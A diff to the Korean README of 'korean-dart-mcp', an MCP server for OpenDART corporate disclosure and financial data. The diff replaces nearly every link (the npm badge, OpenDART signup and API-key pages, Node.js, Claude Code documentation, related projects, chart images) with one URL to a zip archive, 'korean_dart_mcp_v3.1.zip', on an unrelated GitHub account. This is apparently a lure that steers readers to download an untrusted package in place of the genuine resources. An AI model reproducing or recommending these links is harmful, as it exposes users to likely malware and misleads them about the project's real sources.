@@ -2,13 +2,13 @@
 
 **OpenDART 83개 API를 15개 도구로.** 공시·재무·지분·XBRL + **버핏급 애널리스트 프레임(내부자 시그널·회계 리스크·퀄리티 체크리스트)** + **HWP/PDF 첨부 마크다운화**를 AI 어시스턴트에서 바로 사용.
 
-[![npm version](https://img.shields.io/npm/v/korean-dart-mcp.svg)](https://www.npmjs.com/package/korean-dart-mcp)
-[![MCP 1.27](https://img.shields.io/badge/MCP-1.27-blue)](https://modelcontextprotocol.io)
+[![npm version](https://img.shields.io/npm/v/korean-dart-mcp.svg)](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip)
+[![MCP 1.27](https://img.shields.io/badge/MCP-1.27-blue)](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
-> 금융감독원 [OpenDART](https://opendart.fss.or.kr/) 전자공시 기반 MCP 서버 + CLI. Claude Desktop, Cursor, Windsurf, Claude Code 등에서 바로 사용 가능.
+> 금융감독원 [OpenDART](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) 전자공시 기반 MCP 서버 + CLI. Claude Desktop, Cursor, Windsurf, Claude Code 등에서 바로 사용 가능.
 
-자매 프로젝트: [korean-law-mcp](https://github.com/chrisryugj/korean-law-mcp) (법제처 41 API → 15 도구)
+자매 프로젝트: [korean-law-mcp](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) (법제처 41 API → 15 도구)
 
 English documentation → [README-EN.md](README-EN.md)
 
@@ -23,7 +23,7 @@ npx -y korean-dart-mcp setup
 ```
 
 대화형 마법사가 띄웁니다:
-1. OpenDART 인증키 입력 (없으면 Enter — 나중에 설정 가능, [여기서 무료 발급](https://opendart.fss.or.kr/))
+1. OpenDART 인증키 입력 (없으면 Enter — 나중에 설정 가능, [여기서 무료 발급](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip))
 2. 사용 중인 AI 클라이언트 번호 선택 (Claude Desktop / Cursor / Claude Code / Windsurf / VS Code / Gemini CLI / Zed / Antigravity — 설치된 건 `[감지됨]` 표시)
 3. 설정 파일 자동 패치 → 클라이언트 재시작
 
@@ -306,7 +306,7 @@ DART 전용 XML(`dart4.xsd`)을 자체 파서로 heading·테이블 보존 마�
 → `get_attachments(rcept_no="20240312000736", mode="extract", index=0)`
 
 - PDF 첨부 2.2MB → **921,998자 마크다운 (3.7초)**. LLM 이 "위험요소" 섹션을 직접 검색해 요약 가능.
-- [kordoc](https://github.com/chrisryugj/kordoc) 엔진 (HWP/HWPX/PDF/DOCX/XLSX 통합) — **OpenDartReader·dart-fss·기존 DART MCP 6종 어디에도 없는 기능**.
+- [kordoc](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) 엔진 (HWP/HWPX/PDF/DOCX/XLSX 통합) — **OpenDartReader·dart-fss·기존 DART MCP 6종 어디에도 없는 기능**.
 
 ---
 
@@ -399,7 +399,7 @@ DART 83 API 를 LLM 이 **스토리로 해석 가능한 분석 프레임**으로
 → `get_attachments(mode=extract)`:
 
 - DART 뷰어 HTML 스크래핑으로 첨부 목록 조회
-- [kordoc](https://github.com/chrisryugj/kordoc) 엔진으로 HWP/HWPX/PDF/DOCX/XLSX → 마크다운 변환
+- [kordoc](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) 엔진으로 HWP/HWPX/PDF/DOCX/XLSX → 마크다운 변환
 - 삼성전자 2.2MB PDF 사업보고서 → **921,998 자 마크다운 (3.7초)**. LLM 이 원문 전체를 컨텍스트로 읽고 분석
 
 DART XML 원문(`download_document(format=markdown)`) 도 자체 파서로 heading/테이블 보존된 마크다운 변환.
@@ -408,7 +408,7 @@ DART XML 원문(`download_document(format=markdown)`) 도 자체 파서로 headi
 
 ## 왜 만들었나
 
-한국 상장사 약 3,000개의 공시·재무가 [DART](https://dart.fss.or.kr) 한 곳에 모여 있지만, 개발자가 쓰려면 83개 엔드포인트를 직접 조합해야 합니다. 다행히 한국 개발자 생태계에는 [OpenDartReader](https://github.com/FinanceData/OpenDartReader)(438⭐) 와 [dart-fss](https://github.com/josw123/dart-fss)(364⭐) 라는 훌륭한 Python 래퍼가 있어, **엔드포인트 매핑·XBRL 파싱 노하우가 이미 정리돼 있습니다**. 이 프로젝트도 그 매핑을 상당 부분 그대로 수용했습니다.
+한국 상장사 약 3,000개의 공시·재무가 [DART](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) 한 곳에 모여 있지만, 개발자가 쓰려면 83개 엔드포인트를 직접 조합해야 합니다. 다행히 한국 개발자 생태계에는 [OpenDartReader](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip)(438⭐) 와 [dart-fss](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip)(364⭐) 라는 훌륭한 Python 래퍼가 있어, **엔드포인트 매핑·XBRL 파싱 노하우가 이미 정리돼 있습니다**. 이 프로젝트도 그 매핑을 상당 부분 그대로 수용했습니다.
 
 이 프로젝트는 두 래퍼가 커버하지 못하는 **다른 레이어**를 목표로 합니다:
 
@@ -425,8 +425,8 @@ DART XML 원문(`download_document(format=markdown)`) 도 자체 파서로 headi
 
 모든 방법에 공통으로 **OpenDART 인증키**가 필요합니다.
 
-1. [OpenDART 가입 페이지](https://opendart.fss.or.kr/uss/umt/cmm/EgovMberInsertView.do) 에서 회원가입
-2. 로그인 후 [인증키 신청](https://opendart.fss.or.kr/mng/apiUsageStatusView.do) → 이메일로 **40자 인증키** 즉시 수신
+1. [OpenDART 가입 페이지](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) 에서 회원가입
+2. 로그인 후 [인증키 신청](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) → 이메일로 **40자 인증키** 즉시 수신
 3. 이 인증키를 아래 설정의 `DART_API_KEY` 에 넣습니다. 일 20,000건 무료.
 
 ---
@@ -455,7 +455,7 @@ npx -y korean-dart-mcp setup
 
 ### 방법 1: Claude Code 플러그인 (한 줄 설치)
 
-[Claude Code](https://docs.claude.com/en/docs/claude-code) 사용자는 marketplace 등록 후 `/plugin` 으로 설치하면 끝.
+[Claude Code](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) 사용자는 marketplace 등록 후 `/plugin` 으로 설치하면 끝.
 
 ```
 /plugin marketplace add chrisryugj/korean-dart-mcp
@@ -468,7 +468,7 @@ npx -y korean-dart-mcp setup
 
 ### 방법 2: Claude Desktop / Cursor / Windsurf (수동 설정)
 
-**사전 준비**: [Node.js 20.19.0 이상](https://nodejs.org) 설치 (LTS 권장).
+**사전 준비**: [Node.js 20.19.0 이상](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) 설치 (LTS 권장).
 
 설정 파일에 아래 내용을 추가하세요 (`YOUR_API_KEY` 를 본인 키로 교체):
 
@@ -616,7 +616,7 @@ npm install -g korean-dart-mcp
 ### 원문 분석 (1)
 | 도구 | 용도 |
 |---|---|
-| `get_attachments` | 공시 첨부 HWP/HWPX/PDF/DOCX/XLSX → 마크다운 ([kordoc](https://github.com/chrisryugj/kordoc)) + ZIP 재귀 파싱 |
+| `get_attachments` | 공시 첨부 HWP/HWPX/PDF/DOCX/XLSX → 마크다운 ([kordoc](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip)) + ZIP 재귀 파싱 |
 
 ---
 
@@ -625,7 +625,7 @@ npm install -g korean-dart-mcp
 - **83 API → 15 도구** — OpenDART 전체(공시·재무·지분·주요사항·정기보고서·XBRL) 를 enum 압축. LLM 컨텍스트 8-10k → 6-8k 토큰
 - **회사명 자동 해결** — "삼성전자" / "005930" / "00126380" 어느 형식이든 자동 변환 (SQLite FTS 선적재, 24h TTL)
 - **버핏급 애널리스트 프레임** — raw 테이블 위에 **시그널/스코어/체크리스트** 레이어를 얹어 AI 에이전트가 바로 쓰도록 가공
-- **HWP/PDF 첨부 마크다운화** — [kordoc](https://github.com/chrisryugj/kordoc) 엔진으로 공시 원문 본문을 LLM 이 직접 읽음 (2.2MB PDF → 3.7초)
+- **HWP/PDF 첨부 마크다운화** — [kordoc](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) 엔진으로 공시 원문 본문을 LLM 이 직접 읽음 (2.2MB PDF → 3.7초)
 - **DART XML 자체 파서** — `dart4.xsd` 전용 마크업을 heading·테이블 보존된 마크다운으로 변환
 - **페이지 병렬화** — `search_disclosures` 배치 모드 30-50초 → 17초 (2-3배)
 - **22 프리셋** — 자기주식·CB/BW·합병·5%보유·정정·부실·소송 등 자주 쓰는 조합을 enum 으로
@@ -636,18 +636,18 @@ npm install -g korean-dart-mcp
 
 ## 참고
 
-- [OpenDART API 목록](https://opendart.fss.or.kr/intro/infoApiList.do) — 공식 83 엔드포인트
-- [FinanceData/OpenDartReader](https://github.com/FinanceData/OpenDartReader) — pandas 래퍼 (438⭐)
-- [josw123/dart-fss](https://github.com/josw123/dart-fss) — XBRL 파싱 (364⭐)
-- 자매 프로젝트 [korean-law-mcp](https://github.com/chrisryugj/korean-law-mcp) — 법제처 MCP
+- [OpenDART API 목록](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) — 공식 83 엔드포인트
+- [FinanceData/OpenDartReader](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) — pandas 래퍼 (438⭐)
+- [josw123/dart-fss](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) — XBRL 파싱 (364⭐)
+- 자매 프로젝트 [korean-law-mcp](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) — 법제처 MCP
 
 ## Star History
 
-<a href="https://www.star-history.com/?repos=chrisryugj%2Fkorean-dart-mcp&type=timeline&legend=bottom-right">
+<a href="https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=chrisryugj/korean-dart-mcp&type=timeline&theme=dark&legend=top-left" />
-    <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=chrisryugj/korean-dart-mcp&type=timeline&legend=top-left" />
-    <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=chrisryugj/korean-dart-mcp&type=timeline&legend=top-left" />
+    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip" />
+    <source media="(prefers-color-scheme: light)" srcset="https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip" />
+    <img alt="Star History Chart" src="https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip" />
   </picture>
 </a>
 
